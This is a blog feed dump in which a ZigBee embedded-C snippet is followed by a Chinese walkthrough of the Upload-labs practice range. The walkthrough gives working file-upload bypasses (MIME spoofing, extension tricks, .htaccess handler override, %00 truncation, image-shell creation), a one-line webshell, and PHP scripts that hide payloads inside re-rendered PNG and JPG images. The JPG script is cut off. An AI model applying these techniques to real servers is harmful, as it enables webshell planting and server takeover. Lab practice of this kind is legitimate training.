class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   LS164_Cfg();<span class="comment">//74LS164控制数码管的初始化</span></span><br><span class="line">   Init32M(); <span class="comment">//主时钟晶振工作在32M </span></span><br><span class="line">   halRfInit();</span><br><span class="line">   Uart0_Cfg();</span><br><span class="line">   </span><br><span class="line">  SHORT_ADDR0=<span class="number">0xEF</span>;</span><br><span class="line">  SHORT_ADDR1=<span class="number">0xBE</span>;<span class="comment">//设置本模块地址  0xBEEF</span></span><br><span class="line">  </span><br><span class="line">    LS164_BYTE(<span class="number">2</span>); </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RevRFProc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">static</span> <span class="keyword">char</span> len;</span><br><span class="line"> <span class="keyword">static</span> <span class="keyword">char</span>  ch;</span><br><span class="line"></span><br><span class="line">    len=ch=<span class="number">0</span>;</span><br><span class="line">    RFIRQM0 &amp;= ~<span class="number">0x40</span>;</span><br><span class="line">    IEN2 &amp;= ~<span class="number">0x01</span>;</span><br><span class="line">    EA=<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    len=RFD;<span class="comment">//读第一个字节判断这一串数据后面有几个字节；</span></span><br><span class="line">    <span class="comment">//len=0x0C 12</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (len&gt;<span class="number">0</span>) </span><br><span class="line">    &#123;<span class="comment">//只要后面还有数据那么就把他都从接受缓冲区取出来</span></span><br><span class="line">        ch=RFD;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">3</span>==len)</span><br><span class="line">        &#123;<span class="comment">//如果倒数第三个字节等于7，那么我们把LED0取反</span></span><br><span class="line">           LS164_BYTE(ch);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        len--;</span><br><span class="line">     &#125;     </span><br><span class="line">    EA=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">// enable RXPKTDONE interrupt</span></span><br><span class="line">    RFIRQM0 |= <span class="number">0x40</span>;</span><br><span class="line">    <span class="comment">// enable general RF interrupts</span></span><br><span class="line">    IEN2 |= <span class="number">0x01</span>;        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> vector=RF_VECTOR</span></span><br><span class="line"><span class="function">__interrupt <span class="keyword">void</span> <span class="title">RF_IRQ</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//这个是射频中断函数，当小灯模块接收到开关模块发送来的数据时，小灯模块的CPU就会进入中断函数执行</span></span><br><span class="line">    EA=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>( RFIRQF0 &amp; <span class="number">0x40</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        RevRFProc();</span><br><span class="line">             </span><br><span class="line">        RFIRQF0&amp;= ~<span class="number">0x40</span>;   <span class="comment">// Clear RXPKTDONE interrupt</span></span><br><span class="line">    &#125;</span><br><span class="line">    S1CON= <span class="number">0</span>;                   <span class="comment">// Clear general RF interrupt flag</span></span><br><span class="line">    RFST = <span class="number">0xEC</span>;<span class="comment">//清接收缓冲器</span></span><br><span class="line">    RFST = <span class="number">0xE3</span>;<span class="comment">//开启接收使能 </span></span><br><span class="line">    EA=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ZigBee </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ZigBee </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload-labs靶场</title>
      <link href="/2020/02/09/Upload-labs%E9%9D%B6%E5%9C%BA/"/>
      <url>/2020/02/09/Upload-labs%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><p>前端验证，审查元素删除HTML中的onsubmit属性再上传即可</p><h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p>MIME验证抓包修改 <code>Content-Type</code> 为 <code>image/jpeg</code> 后Forward即可</p><h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><p>黑名单绕过，上传<code>.phtml</code>后缀即可</p><h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><p>黑名单过滤了大多数后缀，于是上传<code>.htaccess</code>文件，内容如下，再上传后缀为<code>.jpg</code>的图片马即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure><h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><p>黑名单过滤的绝大多数后缀名，并未进行大小写转换，于是上传<code>.Php</code>后缀即可</p><h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><p>黑名单绕过，抓包在后缀名最后加上一个空格即可上传绕过</p><h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><p>没进行删除末尾的点的函数，抓包在后缀名后加上一个点即可</p><h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><p>未过滤<code>::$DATA</code>，利用Windows解析特性，抓包在后缀名后面添加上<code>::$DATA</code>即可绕过</p><blockquote><p>php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名</p></blockquote><h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><p>此处文件路径拼接的是处理后的文件名，于是上传后缀为<code>php. .</code>的文件即可</p><h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><p>函数将黑名单内的后缀名替换成空，这里双写后缀名<code>.pphphp</code>即可</p><h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><p>白名单验证，提示上传路径可控，发现在上传一个文件之后就会get一个文件路径参数，于是利用%00截断，使得文件路径为upload/1.php%00(文件名)，后面的文件没就就没读取了，这样访问upload/1.php即可获得木马路径。</p><p>版本要求：</p><blockquote><p>php版本要小于5.3.4，5.3.4及以上已经修复该问题</p><p>magic_quotes_gpc需要为OFF状态</p></blockquote><h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><p>与上题不一样这题改用了POST方法，一样%00截断抓包改即可，php版本需要注意</p><blockquote><p>因为是十六进制所以这种截断叫做是<code>0x00截断</code>，其实是<code>%00截断</code>最终被<code>url解码</code>还是会变成<code>0x00</code>的。在<code>url</code>中<code>%00</code>表示<code>ascll</code>码中的<code>0</code>，而<code>ascii</code>中<code>0</code>作为特殊字符保留，表示字符串结束，所以当<code>url</code>中出现<code>%00</code>时就会认为读取已结束。</p></blockquote><h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>cmd到两个文件所在路径下用copy命令制作图片马</p><blockquote><p>png：copy 1.png/b + 1.php/a shell.png</p><p>jpg：copy 1.jpg/b + 1.php/a shell.jpg</p><p>jpg：copy 1.gif/b + 1.php/a shell.gif</p></blockquote><p>制作好后上传，在文件包含漏洞页面getfile参数进行读取解析即可 <code>?file=./upload/6420200209090636.png</code>（三种都一样）</p><h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>后台代码改了，用的getimagesize函数判断后缀，但是解题方法还是和上题一样</p><h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>本题用了php_exif模块来判断文件类型，图片马一样可以绕过</p><blockquote><p>用于读取一个图像的第一个字节并检查其签名</p><p>如果发现了恰当的签名则返回一个对应的常量，否则返回false</p></blockquote><h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>参考：<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a></p><p>这题存在对图片的二次渲染</p><h4 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h4><p>将做好的GIF图片马上传上去，利用文件包含漏洞进行读取，发现图片中的php代码并没有被解析，并且图片进行了二次渲染重构，内容被改写，于是使用GIF图的处理方法，将图片内容保存下来，与上传前的图片马作比较，发现有一部分没有被重写（如下图），于是将一句话插入到这一部分内容中，保存，重新上传，成功解析</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209171705862.png" alt=""></p><h4 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h4><h5 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h5><p>这里有国外大牛的脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">   $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">'./1.png'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但我TM竟然不知道<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>这个怎么利用？？？！！！</p><p>制作好png上传后下载下来成功镶入了那句话，但我还是不知道怎么用。。。算了先放这里</p><h5 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h5><p>在PLTE数据块后加入一句话</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209201526629.png" alt=""></p><p>计算PLTE数据块的CRC<br>CRC脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">png = open(<span class="string">r'2.png'</span>,<span class="string">'rb'</span>)</span><br><span class="line">a = png.read()</span><br><span class="line">png.close()</span><br><span class="line">hexstr = binascii.b2a_hex(a)</span><br><span class="line"></span><br><span class="line"><span class="string">''' PLTE crc '''</span></span><br><span class="line">data =  <span class="string">'504c5445'</span>+ re.findall(<span class="string">'504c5445(.*?)49444154'</span>,hexstr)[<span class="number">0</span>]</span><br><span class="line">crc = binascii.crc32(data[:<span class="number">-16</span>].decode(<span class="string">'hex'</span>)) &amp; <span class="number">0xffffffff</span></span><br><span class="line"><span class="keyword">print</span> hex(crc)</span><br></pre></td></tr></table></figure><p>运算结果：526579b0</p><p>修改CRC值</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209201005832.png" alt=""></p><p>将这个图片上传就传上一句话了（反正我是没搞出来）。。。<a href="https://github.com/Yang1k/upload-labs-Pass16" target="_blank" rel="noopener">原文中素材链接</a></p><h4 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h4><p>首先准备一张.jpg后缀的文件，上传上去然后将二次渲染后的图片下载下来命名为1.jpg</p><p>然后上国外大佬脚本，并且命名为<code>jpg_payload.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs "Something's wrong".</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    $miniPayload = <span class="string">"&lt;?=phpinfo();?&gt;"</span>; <span class="comment">/*这里插入想插入的一句话代码*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">'gd'</span>) || !function_exists(<span class="string">'imagecreatefromjpeg'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'php-gd is not installed'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'php jpg_payload.php &lt;jpg_name.jpg&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">"custom_error_handler"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = <span class="keyword">new</span> DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">        $outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">        $extraBytes = <span class="number">0</span>;</span><br><span class="line">        $correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($dis-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Incorrect SOI marker'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            <span class="keyword">if</span>($marker === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(<span class="string">'_'</span>.$argv[<span class="number">1</span>], $outStreamTmp, <span class="keyword">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>($dis-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>($dis-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'Success!'</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Something\'s wrong'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span><span class="params">($filename, $data, $unlink = FALSE)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        <span class="keyword">if</span>($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        <span class="keyword">return</span> $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span><span class="params">($errno, $errstr, $errfile, $errline)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = <span class="keyword">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\d+) extraneous bytes before marker/'</span>, $errstr, $m)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($m[<span class="number">1</span>])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $binData;</span><br><span class="line">        <span class="keyword">private</span> $order;</span><br><span class="line">        <span class="keyword">private</span> $size;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $order = false, $fromString = false)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">            <span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'File not exists ['</span>.$filename.<span class="string">']'</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span><span class="params">($skip)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">            